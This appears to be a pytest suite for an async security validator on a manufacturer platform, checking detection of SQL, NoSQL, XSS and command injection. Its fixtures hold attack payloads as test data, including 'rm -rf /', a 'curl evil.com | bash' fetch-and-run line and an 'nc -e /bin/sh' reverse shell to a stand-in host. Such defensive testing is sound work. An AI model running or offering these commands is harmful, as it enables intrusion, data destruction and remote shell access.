"""
Comprehensive Security Validator Async API tests for manufacturer security foundation.
Addresses critical async API implementation gap identified in reflection_LS8.md.

This test suite validates:
1. Async API interface compliance with proper signatures
2. Comprehensive threat pattern detection (SQL, NoSQL, XSS, etc.)
3. Business data validation with security scoring
4. ML-enhanced threat detection with confidence scoring
5. Performance benchmarks for all security operations
"""

import pytest
import asyncio
import time
import json
import re
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from enum import Enum

# Test imports - these will fail until real implementations exist (RED PHASE)
try:
    from src.security.manufacturer_validator import (
        ManufacturerSecurityValidator, SecurityThreat, ValidationResult,
        ThreatDetectionResult, BusinessDataValidationResult, ThreatPattern,
        SecurityScore, MLThreatModel
    )
    from src.auth.exceptions import (
        SecurityThreatDetectedError, ValidationError, 
        MLModelNotLoadedError, ThreatPatternError
    )
except ImportError as e:
    pytest.skip(f"Security validator async modules not implemented: {e}", allow_module_level=True)


class ThreatType(Enum):
    """Threat types for detection"""
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XML_INJECTION = "xml_injection"
    SCRIPT_INJECTION = "script_injection"


class BusinessDataType(Enum):
    """Business data types for validation"""
    BUSINESS_LICENSE = "business_license"
    TAX_ID = "tax_id"
    EMAIL = "email"
    PHONE = "phone"
    ADDRESS = "address"
    BANK_ACCOUNT = "bank_account"
    CREDIT_CARD = "credit_card"
    SSN = "ssn"


@pytest.fixture
async def security_validator():
    """
    Enhanced ManufacturerSecurityValidator fixture with async capabilities.
    NO MOCKS - Real implementation required.
    """
    validator = ManufacturerSecurityValidator(
        threat_detection_enabled=True,
        real_time_monitoring=True,
        performance_optimized=True,
        ml_enhanced=True,
        confidence_threshold=0.8,
        pattern_learning_enabled=True
    )
    await validator.initialize()
    await validator.load_threat_patterns()
    await validator.initialize_ml_models()
    return validator


@pytest.fixture
def sql_injection_payloads():
    """Comprehensive SQL injection test payloads"""
    return [
        "'; DROP TABLE products; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; UPDATE users SET password='hacked' WHERE id=1; --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
    ]


@pytest.fixture
def nosql_injection_payloads():
    """MongoDB-specific NoSQL injection test payloads"""
    return [
        {"$where": "this.name == 'admin'"},
        {"$ne": None},
        {"$regex": ".*"},
        {"manufacturer_id": {"$in": ["'; DROP TABLE products; --"]}},
        {"$expr": {"$gt": ["$price", 0]}},
        {"$or": [{"name": "admin"}, {"role": "admin"}]},
        {"$and": [{"$where": "this.password.length > 0"}]},
        {"username": {"$regex": "^admin"}},
        {"$text": {"$search": "'; DROP TABLE"}},
        {"$lookup": {"from": "users", "localField": "_id", "foreignField": "user_id", "as": "user_data"}},
        {"$eval": "function() { return db.users.find(); }"},
        {"$mapReduce": {"map": "function() { emit(this._id, this); }", "reduce": "function(key, values) { return values; }"}}
    ]


@pytest.fixture
def xss_payloads():
    """Cross-site scripting test payloads"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>"
    ]


@pytest.fixture
def business_data_samples():
    """Sample business data for validation testing"""
    return {
        'valid_samples': {
            BusinessDataType.BUSINESS_LICENSE: "BL123456789",
            BusinessDataType.TAX_ID: "12-3456789",  # Valid EIN format
            BusinessDataType.EMAIL: "business@eyewearcompany.com",
            BusinessDataType.PHONE: "+1-555-123-4567",
            BusinessDataType.ADDRESS: "123 Business St, Suite 100, City, ST 12345",
            BusinessDataType.BANK_ACCOUNT: "123456789012",
            BusinessDataType.CREDIT_CARD: "4111111111111111",  # Valid test card
            BusinessDataType.SSN: "123-45-6789"
        },
        'invalid_samples': {
            BusinessDataType.BUSINESS_LICENSE: "INVALID_FORMAT_123",
            BusinessDataType.TAX_ID: "invalid-tax-id",
            BusinessDataType.EMAIL: "invalid-email-format",
            BusinessDataType.PHONE: "not-a-phone-number",
            BusinessDataType.ADDRESS: "'; DROP TABLE addresses; --",
            BusinessDataType.BANK_ACCOUNT: "abc123",
            BusinessDataType.CREDIT_CARD: "1234567890123456",  # Invalid card
            BusinessDataType.SSN: "000-00-0000"  # Invalid SSN
        }
    }


class TestAsyncAPIInterfaceCompliance:
    """Test async API interface compliance and signatures"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_async_threat_detection_interface(self, security_validator, sql_injection_payloads):
        """
        Test async threat detection API compliance with proper signatures.
        
        Requirements:
        - detect_threat(threat_type, data) method signature
        - Async initialization and pattern loading
        - Performance: Detection < 10ms
        """
        test_data = {
            "product_name": sql_injection_payloads[0],
            "description": "Malicious product description",
            "manufacturer_id": "mfg_test_001"
        }
        
        # Test SQL injection detection with proper async signature
        start_time = time.perf_counter()
        is_threat = await security_validator.detect_threat(ThreatType.SQL_INJECTION, test_data)
        detection_time = time.perf_counter() - start_time
        
        assert isinstance(is_threat, bool)
        assert is_threat == True, "SQL injection should be detected"
        assert detection_time < 0.01, f"Threat detection too slow: {detection_time:.4f}s"
        
        # Test threat result details with async method
        threat_result = await security_validator.analyze_threat(ThreatType.SQL_INJECTION, test_data)
        
        assert isinstance(threat_result, ThreatDetectionResult)
        assert threat_result.confidence > 0.8, f"Confidence too low: {threat_result.confidence}"
        assert threat_result.threat_type == ThreatType.SQL_INJECTION
        assert threat_result.detected_patterns is not None
        assert len(threat_result.detected_patterns) > 0
        assert threat_result.risk_score is not None
        assert 0.0 <= threat_result.risk_score <= 1.0
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_async_initialization_and_pattern_loading(self, security_validator):
        """
        Test async initialization and threat pattern loading.
        
        Requirements:
        - Proper async initialization
        - Threat pattern loading from multiple sources
        - ML model initialization
        """
        # Test pattern loading status
        patterns_loaded = await security_validator.are_patterns_loaded()
        assert patterns_loaded == True, "Threat patterns should be loaded"
        
        # Test ML models status
        ml_models_loaded = await security_validator.are_ml_models_loaded()
        assert ml_models_loaded == True, "ML models should be loaded"
        
        # Test pattern count and coverage
        pattern_stats = await security_validator.get_pattern_statistics()
        assert pattern_stats["total_patterns"] > 50, "Should have comprehensive pattern coverage"
        assert pattern_stats["threat_types_covered"] >= 8, "Should cover major threat types"
        
        # Verify all threat types have patterns
        for threat_type in ThreatType:
            pattern_count = await security_validator.get_pattern_count(threat_type)
            assert pattern_count > 0, f"No patterns loaded for {threat_type.value}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_concurrent_threat_detection_operations(self, security_validator, sql_injection_payloads, xss_payloads):
        """
        Test concurrent threat detection operations.
        
        Requirements:
        - Support multiple concurrent detections
        - No race conditions in pattern matching
        - Maintain performance under load
        """
        # Prepare test data for concurrent operations
        test_cases = []
        for i, payload in enumerate(sql_injection_payloads[:5]):
            test_cases.append((ThreatType.SQL_INJECTION, {"input": payload, "id": f"sql_{i}"}))
        
        for i, payload in enumerate(xss_payloads[:5]):
            test_cases.append((ThreatType.XSS, {"input": payload, "id": f"xss_{i}"}))
        
        # Perform concurrent threat detections
        async def detect_threat_case(threat_type, data):
            return await security_validator.detect_threat(threat_type, data)
        
        start_time = time.perf_counter()
        tasks = [detect_threat_case(threat_type, data) for threat_type, data in test_cases]
        results = await asyncio.gather(*tasks)
        total_time = time.perf_counter() - start_time
        
        # Verify all threats detected
        assert all(result == True for result in results), "All threats should be detected"
        
        # Verify reasonable performance under concurrent load
        avg_time_per_detection = total_time / len(test_cases)
        assert avg_time_per_detection < 0.02, f"Concurrent detection too slow: {avg_time_per_detection:.4f}s"


class TestComprehensiveThreatDetection:
    """Test comprehensive threat pattern detection"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_comprehensive_sql_injection_detection(self, security_validator, sql_injection_payloads):
        """
        Test comprehensive SQL injection pattern detection.
        
        Requirements:
        - Detect all major SQL injection variants
        - High confidence scoring (>0.8)
        - Detailed pattern matching information
        """
        for i, payload in enumerate(sql_injection_payloads):
            test_data = {"input": payload, "context": f"sql_test_{i}"}
            
            start_time = time.perf_counter()
            is_threat = await security_validator.detect_threat(ThreatType.SQL_INJECTION, test_data)
            detection_time = time.perf_counter() - start_time
            
            assert is_threat == True, f"Failed to detect SQL injection: {payload}"
            assert detection_time < 0.01, f"Detection too slow: {detection_time:.4f}s for payload: {payload}"
            
            # Get detailed analysis
            threat_result = await security_validator.analyze_threat(ThreatType.SQL_INJECTION, test_data)
            assert threat_result.confidence > 0.8, f"Low confidence for SQL injection: {payload}"
            assert len(threat_result.detected_patterns) > 0, f"No patterns detected for: {payload}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_comprehensive_nosql_injection_detection(self, security_validator, nosql_injection_payloads):
        """
        Test MongoDB-specific NoSQL injection patterns.
        
        Requirements:
        - Detect MongoDB operator abuse
        - Identify JavaScript injection in $where
        - Catch aggregation pipeline attacks
        """
        for i, payload in enumerate(nosql_injection_payloads):
            test_data = {"query": payload, "context": f"nosql_test_{i}"}
            
            start_time = time.perf_counter()
            is_threat = await security_validator.detect_threat(ThreatType.NOSQL_INJECTION, test_data)
            detection_time = time.perf_counter() - start_time
            
            assert is_threat == True, f"Failed to detect NoSQL injection: {payload}"
            assert detection_time < 0.01, f"Detection too slow: {detection_time:.4f}s for payload: {payload}"
            
            # Verify specific NoSQL pattern detection
            threat_result = await security_validator.analyze_threat(ThreatType.NOSQL_INJECTION, test_data)
            assert threat_result.confidence > 0.7, f"Low confidence for NoSQL injection: {payload}"
            
            # Check for specific MongoDB operator detection
            if isinstance(payload, dict):
                detected_operators = threat_result.metadata.get("detected_operators", [])
                mongo_operators = ["$where", "$ne", "$regex", "$expr", "$or", "$and", "$eval", "$mapReduce", "$lookup"]
                payload_str = str(payload)
                for op in mongo_operators:
                    if op in payload_str:
                        assert op in detected_operators, f"Failed to detect operator {op} in {payload}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_comprehensive_xss_detection(self, security_validator, xss_payloads):
        """
        Test comprehensive XSS pattern detection.
        
        Requirements:
        - Detect script tag injections
        - Identify event handler abuse
        - Catch encoded XSS attempts
        """
        for i, payload in enumerate(xss_payloads):
            test_data = {"content": payload, "context": f"xss_test_{i}"}
            
            start_time = time.perf_counter()
            is_threat = await security_validator.detect_threat(ThreatType.XSS, test_data)
            detection_time = time.perf_counter() - start_time
            
            assert is_threat == True, f"Failed to detect XSS: {payload}"
            assert detection_time < 0.01, f"Detection too slow: {detection_time:.4f}s for payload: {payload}"
            
            # Verify XSS-specific analysis
            threat_result = await security_validator.analyze_threat(ThreatType.XSS, test_data)
            assert threat_result.confidence > 0.8, f"Low confidence for XSS: {payload}"
            
            # Check for specific XSS vector detection
            xss_vectors = threat_result.metadata.get("xss_vectors", [])
            if "<script" in payload.lower():
                assert "script_tag" in xss_vectors
            if "onerror" in payload.lower():
                assert "event_handler" in xss_vectors
            if "javascript:" in payload.lower():
                assert "javascript_protocol" in xss_vectors
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_command_injection_detection(self, security_validator):
        """
        Test command injection pattern detection.
        
        Requirements:
        - Detect shell command injection
        - Identify command chaining attempts
        - Catch encoded command injection
        """
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& ls -la",
            "`whoami`",
            "$(id)",
            "; curl http://evil.com/steal.sh | bash",
            "| nc -e /bin/sh attacker.com 4444",
            "&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| powershell -Command \"Get-Process\""
        ]
        
        for i, payload in enumerate(command_injection_payloads):
            test_data = {"command": payload, "context": f"cmd_test_{i}"}
            
            is_threat = await security_validator.detect_threat(ThreatType.COMMAND_INJECTION, test_data)
            assert is_threat == True, f"Failed to detect command injection: {payload}"
            
            threat_result = await security_validator.analyze_threat(ThreatType.COMMAND_INJECTION, test_data)
            assert threat_result.confidence > 0.8, f"Low confidence for command injection: {payload}"


class TestBusinessDataValidation:
    """Test comprehensive business data validation"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_business_data_validation_comprehensive(self, security_validator, business_data_samples):
        """
        Test comprehensive business data validation with security scoring.
        
        Requirements:
        - Validate business license formats
        - Check tax ID compliance
        - Verify email and phone formats
        - Security scoring for all validations
        """
        valid_samples = business_data_samples['valid_samples']
        invalid_samples = business_data_samples['invalid_samples']
        
        # Test valid business data
        for data_type, sample_data in valid_samples.items():
            validation_result = await security_validator.validate_business_data(
                {"value": sample_data}, data_type
            )
            
            assert isinstance(validation_result, BusinessDataValidationResult)
            assert validation_result.is_valid == True, f"Valid data rejected: {data_type.value} = {sample_data}"
            assert validation_result.security_score is not None
            assert 0.7 <= validation_result.security_score <= 1.0, f"Security score too low for valid data: {validation_result.security_score}"
            assert validation_result.validation_errors == []
            assert validation_result.data_type == data_type
        
        # Test invalid business data
        for data_type, sample_data in invalid_samples.items():
            validation_result = await security_validator.validate_business_data(
                {"value": sample_data}, data_type
            )
            
            assert validation_result.is_valid == False, f"Invalid data accepted: {data_type.value} = {sample_data}"
            assert validation_result.security_score < 0.5, f"Security score too high for invalid data: {validation_result.security_score}"
            assert len(validation_result.validation_errors) > 0, f"No validation errors for invalid data: {sample_data}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_business_license_validation_patterns(self, security_validator):
        """
        Test business license validation with various formats.
        
        Requirements:
        - Support multiple license formats
        - Validate license number patterns
        - Check license expiration dates
        """
        license_test_cases = [
            {"license": "BL123456789", "state": "CA", "expected_valid": True},
            {"license": "TX-BUS-987654321", "state": "TX", "expected_valid": True},
            {"license": "FL123ABC456", "state": "FL", "expected_valid": True},
            {"license": "INVALID", "state": "CA", "expected_valid": False},
            {"license": "'; DROP TABLE licenses; --", "state": "CA", "expected_valid": False},
            {"license": "", "state": "CA", "expected_valid": False}
        ]
        
        for case in license_test_cases:
            test_data = {
                "license_number": case["license"],
                "state": case["state"],
                "issue_date": "2023-01-01",
                "expiration_date": "2025-01-01"
            }
            
            validation_result = await security_validator.validate_business_data(
                test_data, BusinessDataType.BUSINESS_LICENSE
            )
            
            assert validation_result.is_valid == case["expected_valid"], \
                f"License validation failed for: {case['license']}"
            
            if case["expected_valid"]:
                assert validation_result.security_score > 0.7
            else:
                assert validation_result.security_score < 0.5
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_tax_id_validation_formats(self, security_validator):
        """
        Test tax ID validation with various formats (EIN, SSN, etc.).
        
        Requirements:
        - Validate EIN format (XX-XXXXXXX)
        - Check SSN format (XXX-XX-XXXX)
        - Verify ITIN format
        - Detect invalid formats and injection attempts
        """
        tax_id_test_cases = [
            {"tax_id": "12-3456789", "type": "EIN", "expected_valid": True},
            {"tax_id": "98-7654321", "type": "EIN", "expected_valid": True},
            {"tax_id": "123-45-6789", "type": "SSN", "expected_valid": True},
            {"tax_id": "900-70-0000", "type": "ITIN", "expected_valid": True},
            {"tax_id": "invalid-format", "type": "EIN", "expected_valid": False},
            {"tax_id": "00-0000000", "type": "EIN", "expected_valid": False},
            {"tax_id": "'; DROP TABLE tax_records; --", "type": "EIN", "expected_valid": False}
        ]
        
        for case in tax_id_test_cases:
            test_data = {
                "tax_id": case["tax_id"],
                "id_type": case["type"]
            }
            
            validation_result = await security_validator.validate_business_data(
                test_data, BusinessDataType.TAX_ID
            )
            
            assert validation_result.is_valid == case["expected_valid"], \
                f"Tax ID validation failed for: {case['tax_id']}"
            
            # Check for injection attempt detection
            if "DROP TABLE" in case["tax_id"]:
                assert "injection_attempt" in validation_result.security_flags
                assert validation_result.security_score < 0.1


class TestMLEnhancedThreatDetection:
    """Test ML-enhanced threat detection capabilities"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_ml_threat_confidence_scoring(self, security_validator, sql_injection_payloads):
        """
        Test ML-enhanced threat detection with confidence scoring.
        
        Requirements:
        - ML models provide confidence scores
        - Confidence threshold enforcement (>0.8)
        - Pattern learning and adaptation
        """
        # Test ML confidence scoring for known threats
        for payload in sql_injection_payloads[:5]:  # Test subset for performance
            test_data = {"input": payload}
            
            # Get ML-enhanced analysis
            ml_result = await security_validator.analyze_threat_with_ml(
                ThreatType.SQL_INJECTION, test_data
            )
            
            assert hasattr(ml_result, 'ml_confidence')
            assert hasattr(ml_result, 'pattern_confidence')
            assert hasattr(ml_result, 'combined_confidence')
            
            # Verify confidence scores are reasonable
            assert 0.0 <= ml_result.ml_confidence <= 1.0
            assert 0.0 <= ml_result.pattern_confidence <= 1.0
            assert 0.0 <= ml_result.combined_confidence <= 1.0
            
            # For known SQL injection, combined confidence should be high
            assert ml_result.combined_confidence > 0.8, \
                f"Low ML confidence for SQL injection: {ml_result.combined_confidence}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_ml_pattern_learning_adaptation(self, security_validator):
        """
        Test ML pattern learning and adaptation capabilities.
        
        Requirements:
        - Learn from new threat patterns
        - Adapt detection based on feedback
        - Improve accuracy over time
        """
        # Introduce a new threat pattern
        new_threat_pattern = "CUSTOM_INJECTION_PATTERN_12345"
        test_data = {"input": new_threat_pattern}
        
        # Initial detection (should be low confidence)
        initial_result = await security_validator.analyze_threat_with_ml(
            ThreatType.SQL_INJECTION, test_data
        )
        initial_confidence = initial_result.combined_confidence
        
        # Provide feedback that this is a threat
        await security_validator.provide_threat_feedback(
            test_data, ThreatType.SQL_INJECTION, is_threat=True, confidence=0.95
        )
        
        # Retrain ML model with new pattern
        await security_validator.retrain_ml_models()
        
        # Test detection again (should have higher confidence)
        updated_result = await security_validator.analyze_threat_with_ml(
            ThreatType.SQL_INJECTION, test_data
        )
        updated_confidence = updated_result.combined_confidence
        
        assert updated_confidence > initial_confidence, \
            "ML model should learn from feedback and improve confidence"
        assert updated_confidence > 0.8, \
            "ML model should have high confidence after learning"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_ml_false_positive_optimization(self, security_validator):
        """
        Test ML false positive rate optimization.
        
        Requirements:
        - Minimize false positives
        - Maintain high true positive rate
        - Optimize based on feedback
        """
        # Test legitimate business data that might trigger false positives
        legitimate_data_samples = [
            {"company_name": "O'Reilly Eyewear Co"},  # Apostrophe might trigger SQL injection
            {"product_description": "Frame with <strong>bold</strong> styling"},  # HTML tags
            {"search_query": "glasses OR sunglasses"},  # Boolean operators
            {"address": "123 Main St & Oak Ave"},  # Ampersand
            {"notes": "Customer said: 'I love these frames!'"}  # Quotes
        ]
        
        false_positive_count = 0
        total_tests = len(legitimate_data_samples)
        
        for i, data in enumerate(legitimate_data_samples):
            # Test multiple threat types
            for threat_type in [ThreatType.SQL_INJECTION, ThreatType.XSS, ThreatType.COMMAND_INJECTION]:
                ml_result = await security_validator.analyze_threat_with_ml(threat_type, data)
                
                # If confidence is high but this is legitimate data, it's a false positive
                if ml_result.combined_confidence > 0.8:
                    false_positive_count += 1
                    
                    # Provide negative feedback to improve model
                    await security_validator.provide_threat_feedback(
                        data, threat_type, is_threat=False, confidence=0.1
                    )
        
        # Calculate false positive rate
        false_positive_rate = false_positive_count / (total_tests * 3)  # 3 threat types per sample
        
        # False positive rate should be low (<10%)
        assert false_positive_rate < 0.1, \
            f"False positive rate too high: {false_positive_rate:.2%}"


class TestSecurityPerformanceAndOptimization:
    """Test security validation performance and optimization"""
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_security_validation_performance_benchmarks(self, security_validator, sql_injection_payloads, xss_payloads):
        """
        Test security validation performance requirements.
        
        Requirements:
        - Threat detection < 10ms
        - Business data validation < 20ms
        - ML analysis < 50ms
        """
        # Test threat detection performance
        detection_times = []
        for payload in sql_injection_payloads[:10]:  # Test subset
            test_data = {"input": payload}
            
            start_time = time.perf_counter()
            await security_validator.detect_threat(ThreatType.SQL_INJECTION, test_data)
            detection_time = time.perf_counter() - start_time
            detection_times.append(detection_time)
        
        avg_detection_time = sum(detection_times) / len(detection_times)
        assert avg_detection_time < 0.01, f"Threat detection too slow: {avg_detection_time:.4f}s"
        
        # Test business data validation performance
        validation_times = []
        business_samples = [
            {"email": "test@example.com"},
            {"phone": "+1-555-123-4567"},
            {"tax_id": "12-3456789"}
        ]
        
        for sample in business_samples:
            start_time = time.perf_counter()
            await security_validator.validate_business_data(sample, BusinessDataType.EMAIL)
            validation_time = time.perf_counter() - start_time
            validation_times.append(validation_time)
        
        avg_validation_time = sum(validation_times) / len(validation_times)
        assert avg_validation_time < 0.02, f"Business validation too slow: {avg_validation_time:.4f}s"
        
        # Test ML analysis performance
        ml_times = []
        for payload in sql_injection_payloads[:5]:  # Smaller subset for ML
            test_data = {"input": payload}
            
            start_time = time.perf_counter()
            await security_validator.analyze_threat_with_ml(ThreatType.SQL_INJECTION, test_data)
            ml_time = time.perf_counter() - start_time
            ml_times.append(ml_time)
        
        avg_ml_time = sum(ml_times) / len(ml_times)
        assert avg_ml_time < 0.05, f"ML analysis too slow: {avg_ml_time:.4f}s"
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_high_volume_security_validation(self, security_validator):
        """
        Test security validation under high volume load.
        
        Requirements:
        - Handle high volume validation requests
        - Maintain performance under load
        - No degradation over time
        """
        # Generate high volume test data
        high_volume_requests = 100
        test_payloads = [f"test_payload_{i}" for i in range(high_volume_requests)]
        
        start_time = time.perf_counter()
        
        # Perform high volume validations
        for i, payload in enumerate(test_payloads):
            test_data = {"input": payload}
            await security_validator.detect_threat(ThreatType.SQL_INJECTION, test_data)
            
            # Check performance every 20 requests
            if (i + 1) % 20 == 0:
                current_time = time.perf_counter()
                elapsed_time = current_time - start_time
                avg_time_per_request = elapsed_time / (i + 1)
                assert avg_time_per_request < 0.02, \
                    f"High volume validation degraded: {avg_time_per_request:.4f}s per request"
        
        total_time = time.perf_counter() - start_time
        avg_time_per_request = total_time / high_volume_requests
        
        assert avg_time_per_request < 0.015, \
            f"High volume validation too slow: {avg_time_per_request:.4f}s per request"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])